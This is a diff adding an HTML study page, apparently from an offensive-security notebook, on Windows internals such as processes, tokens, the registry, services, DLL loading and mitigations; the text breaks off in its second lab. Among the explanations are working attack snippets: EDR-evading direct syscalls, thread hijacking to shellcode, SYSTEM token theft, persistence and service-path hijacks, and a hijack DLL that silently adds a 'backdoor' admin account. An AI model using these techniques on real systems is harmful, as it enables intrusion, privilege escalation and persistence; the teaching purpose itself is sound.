@@ -1,0 +1,1671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Internals</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Windows Internals</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- NOTES TAB                                                    -->
+      <!-- ============================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== WINDOWS API LAYERS ==================== -->
+        <h2>Windows API Layers</h2>
+        <p>Every user-mode API call flows through the same pipeline:</p>
+<pre><code class="language-c">// User code
+CreateFile(...)                     // kernel32.dll (Win32 API)
+  → NtCreateFile(...)              // ntdll.dll (native API wrapper)
+    → syscall instruction          // transition to kernel mode
+      → nt!NtCreateFile            // kernel-mode handler</code></pre>
+
+        <table>
+          <tr><th>Layer</th><th>DLL</th><th>Role</th></tr>
+          <tr><td>Win32 API</td><td>kernel32, user32, advapi32</td><td>Documented, stable API surface</td></tr>
+          <tr><td>Native API</td><td>ntdll.dll</td><td>Thin wrappers that set up syscall number + args</td></tr>
+          <tr><td>Syscall stub</td><td>ntdll.dll</td><td><code>mov r10, rcx; mov eax, SSN; syscall</code></td></tr>
+          <tr><td>Kernel</td><td>ntoskrnl.exe</td><td>Actual implementation via SSDT dispatch</td></tr>
+        </table>
+
+        <h3>Syscall Stubs in ntdll</h3>
+<pre><code class="language-c">// Typical ntdll syscall stub (x64):
+NtCreateFile:
+  mov r10, rcx          // rcx is clobbered by syscall, save to r10
+  mov eax, 0x55         // System Service Number (SSN) — varies by build
+  test byte ptr [SharedUserData+0x308], 1
+  jne  use_int2e        // fallback for older CPUs
+  syscall
+  ret
+use_int2e:
+  int 2Eh
+  ret</code></pre>
+
+        <h3>Direct Syscalls (EDR Evasion)</h3>
+        <p>Malware calls <code>syscall</code> directly to bypass ntdll hooks placed by EDRs. Requires resolving the correct SSN per OS build.</p>
+<pre><code class="language-c">// Concept: read SSN from ntdll's own stub, then invoke syscall directly
+// Avoids executing ntdll code where EDR inline hooks live
+DWORD GetSSN(const char *funcName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *func = (BYTE *)GetProcAddress(ntdll, funcName);
+    // SSN is at offset +4 in the stub: mov eax, <SSN>
+    if (func[0] == 0x4c && func[3] == 0xb8)
+        return *(DWORD *)(func + 4);
+    return 0;
+}</code></pre>
+
+        <!-- ==================== PROCESSES ==================== -->
+        <h2>Processes</h2>
+
+        <h3>EPROCESS (Executive Process Block)</h3>
+        <p>Every process is represented by an <code>EPROCESS</code> structure in kernel memory. Key fields:</p>
+        <table>
+          <tr><th>Field</th><th>Description</th></tr>
+          <tr><td><code>Pcb</code> (KPROCESS)</td><td>Embedded scheduler/kernel block (first member)</td></tr>
+          <tr><td><code>UniqueProcessId</code></td><td>PID</td></tr>
+          <tr><td><code>ActiveProcessLinks</code></td><td>Doubly-linked list connecting all EPROCESS blocks</td></tr>
+          <tr><td><code>Token</code></td><td>Pointer to the process's primary access token</td></tr>
+          <tr><td><code>ImageFileName</code></td><td>First 15 chars of the executable name</td></tr>
+          <tr><td><code>Protection</code></td><td>PP/PPL protection level (PS_PROTECTION)</td></tr>
+          <tr><td><code>Peb</code></td><td>Pointer to user-mode PEB</td></tr>
+          <tr><td><code>ObjectTable</code></td><td>Handle table for this process</td></tr>
+          <tr><td><code>InheritedFromUniqueProcessId</code></td><td>Parent PID</td></tr>
+        </table>
+
+        <p><strong>DKOM (Direct Kernel Object Manipulation):</strong> Rootkits unlink a process from <code>ActiveProcessLinks</code> to hide it from Task Manager. The process still runs (scheduler uses KPROCESS) but disappears from the linked list that <code>NtQuerySystemInformation</code> walks.</p>
+
+        <h3>KPROCESS (Kernel Process Block)</h3>
+        <table>
+          <tr><th>Field</th><th>Description</th></tr>
+          <tr><td><code>DirectoryTableBase</code></td><td>CR3 value — physical address of page table root</td></tr>
+          <tr><td><code>BasePriority</code></td><td>Default thread scheduling priority</td></tr>
+          <tr><td><code>ThreadListHead</code></td><td>List of KTHREAD blocks belonging to this process</td></tr>
+          <tr><td><code>Affinity</code></td><td>Processor affinity mask</td></tr>
+        </table>
+
+        <h3>PEB (Process Environment Block)</h3>
+        <p>User-mode structure accessible via <code>fs:[0x30]</code> (x86) or <code>gs:[0x60]</code> (x64). Contains info the process needs at runtime.</p>
+        <table>
+          <tr><th>Field</th><th>Offset (x64)</th><th>Description</th></tr>
+          <tr><td><code>BeingDebugged</code></td><td>0x002</td><td>1 if a debugger is attached — anti-debug check target</td></tr>
+          <tr><td><code>ImageBaseAddress</code></td><td>0x010</td><td>Base address of the main executable</td></tr>
+          <tr><td><code>Ldr</code></td><td>0x018</td><td>Pointer to PEB_LDR_DATA (loaded module lists)</td></tr>
+          <tr><td><code>ProcessParameters</code></td><td>0x020</td><td>Command line, environment, current directory</td></tr>
+          <tr><td><code>NtGlobalFlag</code></td><td>0x0BC</td><td>Debug flags — another anti-debug check</td></tr>
+        </table>
+
+<pre><code class="language-c">// Reading PEB fields in C
+#include &lt;winternl.h&gt;
+
+PPEB peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock;
+BOOL beingDebugged = peb-&gt;BeingDebugged;
+PVOID imageBase = peb-&gt;ImageBaseAddress;
+
+// Walk loaded modules via Ldr
+PLIST_ENTRY head = &amp;peb-&gt;Ldr-&gt;InMemoryOrderModuleList;
+PLIST_ENTRY entry = head-&gt;Flink;
+while (entry != head) {
+    PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
+        entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    wprintf(L"%s @ %p\n", mod-&gt;FullDllName.Buffer, mod-&gt;DllBase);
+    entry = entry-&gt;Flink;
+}</code></pre>
+
+        <h3>Process Creation Flow (Brief)</h3>
+        <ol>
+          <li><code>CreateProcessW</code> → validates parameters, finds executable</li>
+          <li>NtCreateUserProcess → creates EPROCESS, KPROCESS, address space (CR3), maps ntdll</li>
+          <li>Kernel creates initial thread (ETHREAD/KTHREAD)</li>
+          <li>PEB + TEB allocated in new process address space</li>
+          <li>Image + ntdll mapped; kernel returns to user mode</li>
+          <li>ntdll!LdrInitializeThunk → initializes loader, walks DLL imports, calls DllMain for each</li>
+          <li>Control transfers to application entry point</li>
+        </ol>
+
+        <!-- ==================== PROTECTED PROCESSES ==================== -->
+        <h2>Protected Processes (PP / PPL)</h2>
+        <p>Windows restricts which access rights can be obtained on protected processes. Even administrators cannot open them with <code>PROCESS_ALL_ACCESS</code>.</p>
+
+        <table>
+          <tr><th>Level</th><th>Signer</th><th>Examples</th></tr>
+          <tr><td>Protected (PP)</td><td>WinSystem</td><td>System process, Secure System</td></tr>
+          <tr><td>Protected Light (PPL)</td><td>WinTcb</td><td>csrss.exe, smss.exe</td></tr>
+          <tr><td>PPL</td><td>Windows</td><td>services.exe, svchost.exe (some)</td></tr>
+          <tr><td>PPL</td><td>Antimalware</td><td>MsMpEng.exe (Defender)</td></tr>
+          <tr><td>PPL</td><td>Lsa</td><td>lsass.exe (when RunAsPPL enabled)</td></tr>
+          <tr><td>PPL</td><td>Authenticode</td><td>Third-party signed services</td></tr>
+        </table>
+
+        <p><strong>Hierarchy:</strong> A process can only open a target with full access if its signer level is ≥ the target's. PP &gt; PPL. Within PP or PPL, signer ranking: WinSystem &gt; WinTcb &gt; Windows &gt; Antimalware &gt; Lsa &gt; Authenticode.</p>
+
+        <p><strong>Bypasses:</strong> Load a vulnerable signed driver (e.g., with known BYOVD exploits) to strip the Protection field from EPROCESS in kernel memory. Tools: PPLKiller, PPLdump, mimidrv.sys.</p>
+
+        <!-- ==================== THREADS ==================== -->
+        <h2>Threads</h2>
+
+        <h3>ETHREAD / KTHREAD</h3>
+        <table>
+          <tr><th>Structure</th><th>Key Fields</th></tr>
+          <tr><td>ETHREAD</td><td><code>Tcb</code> (embedded KTHREAD), <code>Cid</code> (PID+TID), <code>StartAddress</code>, <code>Win32StartAddress</code>, <code>ThreadListEntry</code></td></tr>
+          <tr><td>KTHREAD</td><td><code>InitialStack</code>, <code>StackLimit</code>, <code>KernelStack</code>, <code>TrapFrame</code> (saved registers), <code>State</code> (Ready/Running/Waiting), <code>BasePriority</code>, <code>Teb</code></td></tr>
+        </table>
+
+        <h3>TEB (Thread Environment Block)</h3>
+        <p>User-mode per-thread structure at <code>gs:[0x30]</code> (x64). Accessible without any API call.</p>
+        <table>
+          <tr><th>Field</th><th>Offset (x64)</th><th>Description</th></tr>
+          <tr><td><code>NtTib.ExceptionList</code></td><td>0x000</td><td>SEH chain head (x86) / unused x64</td></tr>
+          <tr><td><code>NtTib.StackBase</code></td><td>0x008</td><td>Top of thread stack</td></tr>
+          <tr><td><code>NtTib.StackLimit</code></td><td>0x010</td><td>Bottom of committed stack</td></tr>
+          <tr><td><code>ProcessEnvironmentBlock</code></td><td>0x060</td><td>Pointer to PEB</td></tr>
+          <tr><td><code>LastErrorValue</code></td><td>0x068</td><td>GetLastError() value</td></tr>
+          <tr><td><code>ClientId</code></td><td>0x048</td><td>PID + TID</td></tr>
+        </table>
+
+        <h3>Thread Context</h3>
+<pre><code class="language-c">// Get/Set thread register state
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_FULL;
+GetThreadContext(hThread, &amp;ctx);
+
+printf("RIP: 0x%llx\n", ctx.Rip);
+printf("RSP: 0x%llx\n", ctx.Rsp);
+printf("RCX: 0x%llx\n", ctx.Rcx);
+
+// Hijack thread execution
+ctx.Rip = (DWORD64)shellcodeAddr;
+SetThreadContext(hThread, &amp;ctx);</code></pre>
+
+        <!-- ==================== TOKENS ==================== -->
+        <h2>Access Tokens</h2>
+        <p>Every process and thread has a token that determines its security context: who it is, what groups it belongs to, and what privileges it holds.</p>
+
+        <h3>Primary vs Impersonation Tokens</h3>
+        <table>
+          <tr><th>Type</th><th>Scope</th><th>Usage</th></tr>
+          <tr><td>Primary</td><td>Process-wide</td><td>Assigned at process creation; checked for object access</td></tr>
+          <tr><td>Impersonation</td><td>Per-thread</td><td>Thread temporarily assumes another identity (e.g., service handling client request)</td></tr>
+        </table>
+
+        <h3>TOKEN Structure (Key Fields)</h3>
+        <table>
+          <tr><th>Field</th><th>Description</th></tr>
+          <tr><td><code>TokenId</code></td><td>Unique LUID identifying this token instance</td></tr>
+          <tr><td><code>User</code></td><td>SID of the token owner</td></tr>
+          <tr><td><code>Groups</code></td><td>Array of SID_AND_ATTRIBUTES — group memberships</td></tr>
+          <tr><td><code>Privileges</code></td><td>Array of LUID_AND_ATTRIBUTES — e.g., SeDebugPrivilege</td></tr>
+          <tr><td><code>IntegrityLevel</code></td><td>Mandatory integrity label (Low/Medium/High/System)</td></tr>
+          <tr><td><code>ImpersonationLevel</code></td><td>SecurityAnonymous, Identification, Impersonation, Delegation</td></tr>
+          <tr><td><code>SessionId</code></td><td>Logon session</td></tr>
+        </table>
+
+        <h3>Important Privileges</h3>
+        <table>
+          <tr><th>Privilege</th><th>Offensive Use</th></tr>
+          <tr><td><code>SeDebugPrivilege</code></td><td>Open any process regardless of DACL — enables injection into SYSTEM processes</td></tr>
+          <tr><td><code>SeImpersonatePrivilege</code></td><td>Impersonate tokens — potato attacks (JuicyPotato, PrintSpoofer)</td></tr>
+          <tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Assign tokens to new processes — run as another user</td></tr>
+          <tr><td><code>SeBackupPrivilege</code></td><td>Read any file bypassing DACLs — dump SAM/SYSTEM</td></tr>
+          <tr><td><code>SeRestorePrivilege</code></td><td>Write any file bypassing DACLs — overwrite system binaries</td></tr>
+          <tr><td><code>SeTakeOwnershipPrivilege</code></td><td>Take ownership of any object — then modify the DACL</td></tr>
+          <tr><td><code>SeLoadDriverPrivilege</code></td><td>Load kernel drivers — BYOVD for kernel-level access</td></tr>
+        </table>
+
+        <h3>Token Enumeration</h3>
+<pre><code class="language-powershell"># Current user's privileges
+whoami /priv
+
+# Token details
+whoami /all
+
+# List all processes with token info
+Get-Process | ForEach-Object {
+    try {
+        $owner = $_.StartInfo.EnvironmentVariables  # limited
+    } catch {}
+}
+
+# Using PowerShell to check specific privileges
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Claims |
+    Select-Object Type, Value</code></pre>
+
+<pre><code class="language-c">// C: Enable SeDebugPrivilege in current process token
+HANDLE hToken;
+OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+
+TOKEN_PRIVILEGES tp;
+LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
+tp.PrivilegeCount = 1;
+tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+CloseHandle(hToken);</code></pre>
+
+        <h3>Token Manipulation</h3>
+<pre><code class="language-c">// Token theft: duplicate a SYSTEM process token and create a new process with it
+HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPid);
+HANDLE hToken;
+OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;hToken);
+
+HANDLE hNewToken;
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+    SecurityImpersonation, TokenPrimary, &amp;hNewToken);
+
+STARTUPINFOW si = { sizeof(si) };
+PROCESS_INFORMATION pi;
+CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE,
+    L"C:\\Windows\\System32\\cmd.exe", NULL,
+    CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
+
+CloseHandle(hNewToken);
+CloseHandle(hToken);
+CloseHandle(hProcess);</code></pre>
+
+        <!-- ==================== OBJECT MANAGER ==================== -->
+        <h2>Object Manager</h2>
+        <p>The kernel represents resources (files, processes, threads, registry keys, mutexes) as objects. User-mode code accesses them via <strong>handles</strong>, not pointers.</p>
+
+        <h3>Handles &amp; HANDLE_TABLE</h3>
+        <table>
+          <tr><th>Concept</th><th>Description</th></tr>
+          <tr><td>Handle</td><td>Index into the per-process handle table. Multiples of 4 (0x4, 0x8, 0xC...).</td></tr>
+          <tr><td>HANDLE_TABLE</td><td>Per-process table mapping handle values → kernel object pointers + granted access mask</td></tr>
+          <tr><td>Handle entry</td><td>Contains: pointer to OBJECT_HEADER, GrantedAccessMask</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># View handles for a process using Sysinternals handle.exe
+handle.exe -p &lt;pid&gt;
+
+# PowerShell: list handles (requires NtObjectManager module)
+# Install-Module NtObjectManager
+Get-NtHandle -ProcessId &lt;pid&gt; | Select-Object Handle, ObjectType, Name</code></pre>
+
+        <h3>OBJECT_HEADER</h3>
+        <p>Every kernel object is preceded by an <code>OBJECT_HEADER</code>:</p>
+        <table>
+          <tr><th>Field</th><th>Description</th></tr>
+          <tr><td><code>PointerCount</code></td><td>Kernel reference count</td></tr>
+          <tr><td><code>HandleCount</code></td><td>Number of open handles across all processes</td></tr>
+          <tr><td><code>TypeIndex</code></td><td>Encoded index into <code>ObTypeIndexTable</code> — identifies object type</td></tr>
+          <tr><td><code>SecurityDescriptor</code></td><td>DACL/SACL controlling access</td></tr>
+        </table>
+
+        <p><strong>Object types:</strong> Process, Thread, File, Key, Section, Token, Event, Mutant, Semaphore, Desktop, WindowStation, etc.</p>
+
+        <!-- ==================== REGISTRY ==================== -->
+        <h2>Registry</h2>
+
+        <h3>Hive Structure</h3>
+        <table>
+          <tr><th>Hive</th><th>Backing File</th><th>Contents</th></tr>
+          <tr><td>HKLM\SYSTEM</td><td>%SystemRoot%\System32\config\SYSTEM</td><td>Boot config, services, drivers</td></tr>
+          <tr><td>HKLM\SOFTWARE</td><td>%SystemRoot%\System32\config\SOFTWARE</td><td>Installed software, settings</td></tr>
+          <tr><td>HKLM\SAM</td><td>%SystemRoot%\System32\config\SAM</td><td>Local user accounts &amp; password hashes</td></tr>
+          <tr><td>HKLM\SECURITY</td><td>%SystemRoot%\System32\config\SECURITY</td><td>LSA secrets, cached creds</td></tr>
+          <tr><td>HKU\&lt;SID&gt;</td><td>%UserProfile%\NTUSER.DAT</td><td>Per-user settings</td></tr>
+        </table>
+
+        <h3>Persistence Keys</h3>
+<pre><code class="language-powershell"># Run keys — execute on every logon
+HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Services (requires admin)
+HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;
+
+# Scheduled task registration
+HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
+
+# Image File Execution Options — debugger hijack
+HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;target.exe&gt;
+# Set Debugger = "C:\path\to\malware.exe"
+
+# Winlogon
+HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+# Shell, Userinit values
+
+# AppInit_DLLs — injected into every process loading user32.dll
+HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+# AppInit_DLLs = C:\path\to\evil.dll</code></pre>
+
+        <h3>Enumeration Keys</h3>
+<pre><code class="language-powershell"># Installed software
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Select-Object DisplayName, DisplayVersion
+
+# Autoruns
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Last commands (PowerShell history is file-based, but cmd history:)
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"</code></pre>
+
+        <!-- ==================== SERVICES ==================== -->
+        <h2>Services</h2>
+
+        <h3>Service Control Manager (SCM)</h3>
+        <p>SCM (<code>services.exe</code>) manages service lifecycle: start, stop, pause, configuration. Services are defined in <code>HKLM\SYSTEM\CurrentControlSet\Services</code>.</p>
+
+        <table>
+          <tr><th>Service Type</th><th>Value</th><th>Description</th></tr>
+          <tr><td>Win32OwnProcess</td><td>0x10</td><td>Runs in its own svchost.exe or standalone</td></tr>
+          <tr><td>Win32ShareProcess</td><td>0x20</td><td>Shares a svchost.exe with other services</td></tr>
+          <tr><td>KernelDriver</td><td>0x01</td><td>Kernel-mode driver</td></tr>
+          <tr><td>FileSystemDriver</td><td>0x02</td><td>File system filter driver</td></tr>
+          <tr><td>InteractiveProcess</td><td>0x100</td><td>Can interact with desktop (deprecated, Session 0 isolation)</td></tr>
+        </table>
+
+        <h3>Service Accounts</h3>
+        <table>
+          <tr><th>Account</th><th>Privileges</th><th>Network Access</th></tr>
+          <tr><td>LocalSystem</td><td>Full — equivalent to SYSTEM</td><td>Yes (as machine account)</td></tr>
+          <tr><td>LocalService</td><td>Reduced</td><td>Anonymous</td></tr>
+          <tr><td>NetworkService</td><td>Reduced</td><td>Yes (as machine account)</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># List services and their accounts
+Get-WmiObject Win32_Service | Select-Object Name, StartName, State, PathName
+
+# Services running as SYSTEM — high-value targets
+Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" } |
+    Select-Object Name, PathName
+
+# Check service binary permissions (unquoted path / writable path)
+icacls "C:\Program Files\SomeService\service.exe"
+
+# Service binary path manipulation (requires admin)
+sc.exe config VulnService binpath= "C:\temp\evil.exe"
+sc.exe qc VulnService</code></pre>
+
+        <!-- ==================== DLL LOADING ==================== -->
+        <h2>DLL Loading</h2>
+
+        <h3>LoadLibrary Flow</h3>
+        <ol>
+          <li><code>LoadLibraryW</code> (kernel32) → <code>LdrLoadDll</code> (ntdll)</li>
+          <li>Loader checks if DLL is already in the LDR module list</li>
+          <li>If not loaded: resolves path using DLL search order</li>
+          <li>Maps the DLL into the process address space (<code>NtMapViewOfSection</code>)</li>
+          <li>Processes imports (recursive loading)</li>
+          <li>Calls <code>DllMain(DLL_PROCESS_ATTACH)</code></li>
+          <li>Adds entry to all three LDR lists</li>
+        </ol>
+
+        <h3>LDR Module Lists</h3>
+        <p>PEB→Ldr→ contains three linked lists. Each entry is a <code>LDR_DATA_TABLE_ENTRY</code> with <code>DllBase</code>, <code>EntryPoint</code>, <code>FullDllName</code>, <code>SizeOfImage</code>.</p>
+        <table>
+          <tr><th>List</th><th>Order</th></tr>
+          <tr><td><code>InLoadOrderModuleList</code></td><td>Order DLLs were loaded</td></tr>
+          <tr><td><code>InMemoryOrderModuleList</code></td><td>Order by memory address</td></tr>
+          <tr><td><code>InInitializationOrderModuleList</code></td><td>Order DllMain was called (exe excluded)</td></tr>
+        </table>
+
+        <h3>DLL Search Order (Hijacking)</h3>
+        <p>When <code>SafeDllSearchMode</code> is enabled (default):</p>
+        <ol>
+          <li>Directory of the application (the .exe)</li>
+          <li>System directory (<code>C:\Windows\System32</code>)</li>
+          <li>16-bit system directory (<code>C:\Windows\System</code>)</li>
+          <li>Windows directory (<code>C:\Windows</code>)</li>
+          <li>Current working directory</li>
+          <li>Directories in <code>PATH</code></li>
+        </ol>
+
+        <p><strong>DLL Hijacking:</strong> If the application loads a DLL that doesn't exist in the early search locations, place a malicious DLL with the same name in a location searched first (e.g., the application directory).</p>
+
+<pre><code class="language-powershell"># Find DLL hijack opportunities — DLLs that fail to load
+# Use Process Monitor (procmon): filter for "NAME NOT FOUND" + Path ends with ".dll"
+
+# Check which DLLs an exe imports
+dumpbin /imports target.exe
+
+# Or with PowerShell:
+Get-PeImports -Path "C:\target\app.exe"  # requires PETools module</code></pre>
+
+<pre><code class="language-c">// Minimal DLL for hijacking — runs payload on load
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        // Payload executes when target app loads this DLL
+        WinExec("cmd.exe /c net user backdoor P@ss123 /add", SW_HIDE);
+    }
+    return TRUE;
+}</code></pre>
+
+        <!-- ==================== SECURITY MITIGATIONS ==================== -->
+        <h2>Security Mitigations</h2>
+        <table>
+          <tr><th>Mitigation</th><th>Description</th><th>Bypass Notes</th></tr>
+          <tr><td><strong>DEP</strong> (Data Execution Prevention)</td><td>NX bit — marks data pages non-executable</td><td>ROP to call VirtualProtect/VirtualAlloc with PAGE_EXECUTE_READWRITE</td></tr>
+          <tr><td><strong>ASLR</strong></td><td>Randomizes base addresses of exe, DLLs, stack, heap</td><td>Info leak to disclose base address; non-ASLR modules</td></tr>
+          <tr><td><strong>CFG</strong> (Control Flow Guard)</td><td>Validates indirect call targets against a bitmap</td><td>Call existing valid targets; corrupt the bitmap</td></tr>
+          <tr><td><strong>CIG</strong> (Code Integrity Guard)</td><td>Only Microsoft-signed DLLs can be loaded — blocks DLL injection</td><td>Process must opt-in; doesn't block thread injection</td></tr>
+          <tr><td><strong>ACG</strong> (Arbitrary Code Guard)</td><td>Prevents dynamic code generation (no RWX, no modifying executable pages)</td><td>Limits JIT; used by Edge renderer</td></tr>
+          <tr><td><strong>CET</strong> (Control-flow Enforcement)</td><td>Shadow stack (hardware) — return addresses validated on ret</td><td>Hardware-backed; requires CPU support (Intel 11th+ gen)</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Check process mitigations
+Get-ProcessMitigation -Name notepad.exe
+
+# Check system-wide defaults
+Get-ProcessMitigation -System
+
+# Set per-process mitigation
+Set-ProcessMitigation -Name "target.exe" -Enable DEP, CFG, SEHOP
+
+# In C: set CIG on child process
+DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+# Used with UpdateProcThreadAttribute + PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code></pre>
+
+        <!-- ==================== IMPORTANT TOOLS ==================== -->
+        <h2>Important Tools</h2>
+        <table>
+          <tr><th>Tool</th><th>Purpose</th></tr>
+          <tr><td><strong>Process Explorer</strong></td><td>Advanced Task Manager — shows handles, DLLs, threads, GPU, .NET assemblies per process. Color-coded: purple=packed, red=exiting, green=new, pink=services.</td></tr>
+          <tr><td><strong>Process Monitor</strong></td><td>Real-time file, registry, network, process activity. Essential for finding DLL hijacks (NAME NOT FOUND), persistence discovery, malware analysis.</td></tr>
+          <tr><td><strong>API Monitor</strong></td><td>Intercept and log Win32/COM API calls. See arguments + return values. Good for understanding malware API usage.</td></tr>
+          <tr><td><strong>WinDbg</strong></td><td>Kernel + user-mode debugger. See WinDbg reference for commands.</td></tr>
+          <tr><td><strong>x64dbg</strong></td><td>User-mode debugger/disassembler — good for RE and unpacking.</td></tr>
+          <tr><td><strong>PE-bear / CFF Explorer</strong></td><td>PE header analysis — imports, exports, sections, relocations.</td></tr>
+          <tr><td><strong>Sysinternals Suite</strong></td><td>handle.exe, listdlls.exe, autoruns.exe, accesschk.exe, etc.</td></tr>
+        </table>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- LAB TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Process Exploration</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Enumerate process details using PowerShell and Process Explorer. Identify key fields (PID, PPID, token, loaded DLLs).</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: PowerShell Process Enumeration
+# List all processes with parent PID
+Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine |
+    Format-Table -AutoSize
+
+# Get detailed info for a specific process
+$proc = Get-Process -Name "explorer"
+$proc | Format-List Id, ProcessName, StartTime, Modules, Threads
+
+# List loaded DLLs for a process
+(Get-Process -Name "notepad").Modules | Select-Object ModuleName, FileName, BaseAddress
+
+# Find processes by owner
+Get-CimInstance Win32_Process | ForEach-Object {
+    $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner
+    [PSCustomObject]@{
+        PID   = $_.ProcessId
+        Name  = $_.Name
+        Owner = "$($owner.Domain)\$($owner.User)"
+    }
+} | Format-Table -AutoSize
+
+# Part 2: Check process integrity level
+whoami /groups | findstr "Mandatory"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Open Process Explorer (Sysinternals). Enable the Lower Pane (View → Lower Pane View → DLLs). Select <code>explorer.exe</code> — note the loaded DLLs.</li>
+              <li>Switch the Lower Pane to Handles. Find open handles to registry keys and files. Identify any interesting mutex names.</li>
+              <li>Right-click <code>lsass.exe</code> → Properties → Security tab. Note the integrity level and user. Try opening it with <code>Get-Process -Id &lt;lsass_pid&gt;</code> from a non-elevated prompt — observe the access denied.</li>
+              <li>Run the PowerShell commands above. Compare the parent PID chain: <code>explorer.exe</code> → <code>powershell.exe</code> → your scripts. Identify any processes with unexpected parents (possible injection).</li>
+              <li>Use Process Explorer's "Verify Signatures" (Options → Verify Image Signatures). Look for unsigned processes or DLLs — in a real engagement, these are suspicious.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Token Inspection and Manipulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Inspect access tokens, understand privilege levels, and enable SeDebugPrivilege to access a privileged process.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Part 1: Token Inspection
+whoami /priv
+whoami /groups
+whoami /all
+
+# Check if running elevated
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($identity)
+$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)</code></pre>
+
+<pre><code class="language-c">// Part 2: token_lab.c — Enable SeDebugPrivilege and read SYSTEM process memory
+// Compile: cl.exe token_lab.c /Fe:token_lab.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
